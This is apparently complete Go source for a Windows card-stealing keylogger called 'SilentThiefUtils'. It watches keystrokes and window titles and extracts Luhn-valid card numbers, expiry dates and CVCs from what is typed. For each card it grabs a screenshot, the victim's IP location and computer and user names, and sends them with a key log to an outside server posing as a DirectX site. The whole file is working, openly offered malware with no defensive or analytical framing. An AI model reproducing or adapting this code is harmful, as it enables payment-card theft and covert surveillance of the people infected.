package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"io"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var serverLink = "https://getdirectx.com/v2/report"

var (
	user32                     = syscall.NewLazyDLL("user32.dll")
	gdi32                      = syscall.NewLazyDLL("gdi32.dll")
	procGetAsyncKeyState       = user32.NewProc("GetAsyncKeyState")
	procGetDC                  = user32.NewProc("GetDC")
	procReleaseDC              = user32.NewProc("ReleaseDC")
	procGetSystemMetrics       = user32.NewProc("GetSystemMetrics")
	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
	procGetForegroundWindow    = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW         = user32.NewProc("GetWindowTextW")
)

const (
	SRCCOPY        = 0x00CC0020
	BI_RGB         = 0
	DIB_RGB_COLORS = 0
)

type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

type BITMAPINFO struct {
	BmiHeader BITMAPINFOHEADER
	BmiColors [1]uint32
}

var reNonDigit = regexp.MustCompile(`\D`)
var reDigits   = regexp.MustCompile(`\d+`)
var reExpiry   = regexp.MustCompile(`\b(0[1-9]|1[0-2])[/\-](20\d{2}|\d{2})\b`)

type CardInfo struct {
	Number string
	Type   string
	Expiry string
	CVC    string
}

type IPInfo struct {
	IP      string `json:"ip"`
	Country string `json:"country"`
	Region  string `json:"region"`
	City    string `json:"city"`
	Org     string `json:"org"`
}

type KeyEvent struct {
	Time   time.Time
	Key    string
	Window string
}

var keyLog []KeyEvent

// readable names for special keys
var keyNames = map[int]string{
	0x08: "[BACKSPACE]",
	0x09: "[TAB]",
	0x0D: "[ENTER]",
	0x10: "[SHIFT]",
	0x11: "[CTRL]",
	0x12: "[ALT]",
	0x14: "[CAPSLOCK]",
	0x1B: "[ESC]",
	0x20: "[SPACE]",
	0x25: "[LEFT]",
	0x26: "[UP]",
	0x27: "[RIGHT]",
	0x28: "[DOWN]",
	0x2E: "[DEL]",
	0xA0: "[LSHIFT]",
	0xA1: "[RSHIFT]",
	0xA2: "[LCTRL]",
	0xA3: "[RCTRL]",
	0xBD: "-",
	0xBF: "/",
}

var vkMap = map[int]string{
	0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3", 0x34: "4",
	0x35: "5", 0x36: "6", 0x37: "7", 0x38: "8", 0x39: "9",
	0xBF: "/",
	0xBD: "-",
	0x20: " ",
	0x60: "0", 0x61: "1", 0x62: "2", 0x63: "3", 0x64: "4",
	0x65: "5", 0x66: "6", 0x67: "7", 0x68: "8", 0x69: "9",
}

// all keys to monitor (card keys + special keys)
var allMonitoredKeys []int

func init() {
	seen := map[int]bool{}
	for vk := range vkMap {
		seen[vk] = true
		allMonitoredKeys = append(allMonitoredKeys, vk)
	}
	for vk := range keyNames {
		if !seen[vk] {
			seen[vk] = true
			allMonitoredKeys = append(allMonitoredKeys, vk)
		}
	}
}

func isPressed(vk int) bool {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return ret&0x8001 != 0
}

func getForegroundWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 256)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	return syscall.UTF16ToString(buf)
}

func luhn(n string) bool {
	rev := []rune(n)
	for i, j := 0, len(rev)-1; i < j; i, j = i+1, j-1 {
		rev[i], rev[j] = rev[j], rev[i]
	}
	sum := 0
	for i, ch := range rev {
		d, _ := strconv.Atoi(string(ch))
		if i%2 == 1 {
			d *= 2
			if d > 9 {
				d -= 9
			}
		}
		sum += d
	}
	return sum%10 == 0
}

func cardType(n string) string {
	switch {
	case strings.HasPrefix(n, "4"):
		return "Visa"
	case regexp.MustCompile(`^5[1-5]|^2[2-7]`).MatchString(n):
		return "Mastercard"
	case regexp.MustCompile(`^3[47]`).MatchString(n):
		return "Amex"
	case regexp.MustCompile(`^6(?:011|5)`).MatchString(n):
		return "Discover"
	default:
		return "Unknown"
	}
}

func permutations(groups []string) [][]string {
	if len(groups) == 0 {
		return [][]string{{}}
	}
	var result [][]string
	for i, g := range groups {
		rest := append([]string{}, groups[:i]...)
		rest = append(rest, groups[i+1:]...)
		for _, p := range permutations(rest) {
			result = append(result, append([]string{g}, p...))
		}
	}
	return result
}

func parse(raw string) (CardInfo, bool) {
	expiry := ""
	rawNoExp := raw
	if m := reExpiry.FindStringIndex(raw); m != nil {
		expiry = raw[m[0]:m[1]]
		rawNoExp = raw[:m[0]] + " " + raw[m[1]:]
	}

	groups := reDigits.FindAllString(rawNoExp, -1)

	type candidate struct{ card, leftover string }
	var candidates []candidate

	for i, g := range groups {
		if len(g) >= 13 && len(g) <= 19 && luhn(g) {
			other := ""
			for j, og := range groups {
				if j != i {
					other += og
				}
			}
			candidates = append(candidates, candidate{g, other})
		}
	}

	for _, perm := range permutations(groups) {
		joined := strings.Join(perm, "")
		for l := 19; l >= 13; l-- {
			if len(joined) < l {
				continue
			}
			c := joined[:l]
			if luhn(c) {
				candidates = append(candidates, candidate{c, joined[l:]})
				break
			}
		}
	}

	for _, cand := range candidates {
		card, leftover := cand.card, cand.leftover
		if expiry != "" {
			cvc := strings.TrimSpace(leftover)
			if (len(cvc) == 3 || len(cvc) == 4) && reNonDigit.FindString(cvc) == "" {
				return CardInfo{card, cardType(card), expiry, cvc}, true
			}
		} else {
			for _, el := range []int{4, 6} {
				if len(leftover) < el {
					continue
				}
				for pos := 0; pos <= len(leftover)-el; pos++ {
					mm := leftover[pos : pos+2]
					yy := leftover[pos+2 : pos+el]
					cvc := leftover[:pos] + leftover[pos+el:]
					month, _ := strconv.Atoi(mm)
					if month >= 1 && month <= 12 && (len(cvc) == 3 || len(cvc) == 4) && reNonDigit.FindString(cvc) == "" {
						return CardInfo{card, cardType(card), mm + "/" + yy, cvc}, true
					}
				}
			}
		}
	}

	return CardInfo{}, false
}

func getIPInfo() IPInfo {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://ipinfo.io/json")
	if err != nil {
		return IPInfo{IP: "unknown"}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var info IPInfo
	json.Unmarshal(body, &info)
	return info
}

func captureScreenshot() ([]byte, error) {
	w, _, _ := procGetSystemMetrics.Call(0)
	h, _, _ := procGetSystemMetrics.Call(1)
	width := int32(w)
	height := int32(h)

	hdc, _, _ := procGetDC.Call(0)
	defer procReleaseDC.Call(0, hdc)

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdc)
	defer procDeleteDC.Call(hdcMem)

	hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(width), uintptr(height))
	defer procDeleteObject.Call(hBitmap)

	procSelectObject.Call(hdcMem, hBitmap)
	procBitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height), hdc, 0, 0, SRCCOPY)

	bi := BITMAPINFO{}
	bi.BmiHeader.BiSize = uint32(unsafe.Sizeof(bi.BmiHeader))
	bi.BmiHeader.BiWidth = width
	bi.BmiHeader.BiHeight = -height
	bi.BmiHeader.BiPlanes = 1
	bi.BmiHeader.BiBitCount = 32
	bi.BmiHeader.BiCompression = BI_RGB

	pixelSize := int(width) * int(height) * 4
	pixelBuf := make([]byte, pixelSize)

	procGetDIBits.Call(
		hdcMem, hBitmap, 0, uintptr(height),
		uintptr(unsafe.Pointer(&pixelBuf[0])),
		uintptr(unsafe.Pointer(&bi)),
		DIB_RGB_COLORS,
	)

	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			i := (y*int(width) + x) * 4
			img.Pix[(y*int(width)+x)*4+0] = pixelBuf[i+2]
			img.Pix[(y*int(width)+x)*4+1] = pixelBuf[i+1]
			img.Pix[(y*int(width)+x)*4+2] = pixelBuf[i+0]
			img.Pix[(y*int(width)+x)*4+3] = 0xFF
		}
	}

	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, err
	}
	return pngBuf.Bytes(), nil
}

func buildKeyLogText() string {
	events := keyLog
	if len(events) > 100 {
		events = events[len(events)-100:]
	}

	var sb strings.Builder
	sb.WriteString("━━━━ Last 100 keys ━━━━\n")

	prevWindow := ""
	for _, e := range events {
		ts := e.Time.Format("15:04:05")
		if e.Window != prevWindow && e.Window != "" {
			sb.WriteString(fmt.Sprintf("  [%s]\n", e.Window))
			prevWindow = e.Window
		}
		sb.WriteString(fmt.Sprintf("  %s  %s\n", ts, e.Key))
	}
	return sb.String()
}

func doPost(body map[string]string) error {
	jsonData, err := json.Marshal(body)
	if err != nil {
		return fmt.Errorf("json: %w", err)
	}
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Post("https://getdirectx.com/v2/report", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("http: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("status: %s", resp.Status)
	}
	return nil
}

func sendReport(card CardInfo) {
	pcname := os.Getenv("COMPUTERNAME")
	username := os.Getenv("USERNAME")
	ts := time.Now().Format("2006-01-02 15:04:05")
	ip := getIPInfo()

	message := fmt.Sprintf(
		"❤️ SilentThiefUtils coded by r3ci with pure love\n"+
		"━━━━━━━━━━━━━━━━━━━━\n"+
		"💳 New card\n"+
			"━━━━━━━━━━━━━━━━━━━━\n"+
			"💻 Host     : %s@%s\n"+
			"🕐 Time     : %s\n"+
			"━━━━━━━━━━━━━━━━━━━━\n"+
			"💰 Number: %s\n"+
			"🏦 Type: %s\n"+
			"📅 Expiry: %s\n"+
			"🔐 CVC: %s\n"+
			"✅ Luhn: Valid\n"+
			"━━━━━━━━━━━━━━━━━━━━\n"+
			"🌍 IP: %s\n"+
			"📍 Location: %s, %s, %s\n"+
			"🏢 ISP: %s\n"+
			"━━━━━━━━━━━━━━━━━━━━\n"+
			"🔗 https://github.com/R3CI/SilentThiefUtils",
		pcname, username, ts,
		card.Number, card.Type, card.Expiry, card.CVC,
		ip.IP, ip.City, ip.Region, ip.Country, ip.Org,
	)

	screenshot := ""
	if pngData, err := captureScreenshot(); err == nil {
		screenshot = base64.StdEncoding.EncodeToString(pngData)
	}

	bodyFull := map[string]string{
		"chat":       "reporting",
		"message":    message + "\n\n" + buildKeyLogText(),
		"screenshot": screenshot,
	}

	for i := 1; i <= 5; i++ {
		err := doPost(bodyFull)
		if err == nil {
			return
		}
		time.Sleep(2 * time.Second)
	}
	
	bodySlim := map[string]string{
		"chat":       "reporting",
		"message":    message,
		"screenshot": screenshot,
	}

	for i := 1; i <= 5; i++ {
		err := doPost(bodySlim)
		if err == nil {
			return
		}
		time.Sleep(2 * time.Second)
	}
}

func main() {
	buf := ""
	prevState := make(map[int]bool)

	for {
		time.Sleep(10 * time.Millisecond)
		windowTitle := getForegroundWindowTitle()
		for _, vk := range allMonitoredKeys {
			down := isPressed(vk)
			wasDown := prevState[vk]

			if down && !wasDown {
				keyStr := ""
				if name, ok := keyNames[vk]; ok {
					keyStr = name
				} else if ch, ok := vkMap[vk]; ok {
					keyStr = ch
				}
				if keyStr != "" {
					keyLog = append(keyLog, KeyEvent{
						Time:   time.Now(),
						Key:    keyStr,
						Window: windowTitle,
					})
					if len(keyLog) > 500 {
						keyLog = keyLog[len(keyLog)-500:]
					}
				}
			
				if vk == 0x08 {
					if len(buf) > 0 {
						runes := []rune(buf)
						buf = string(runes[:len(runes)-1])
					}
				} else if ch, ok := vkMap[vk]; ok {
					buf += ch
					card, ok := parse(strings.TrimSpace(buf))
					if ok {
						sendReport(card)
						buf = ""
					}
				}
			}
			prevState[vk] = down
		}
	}
}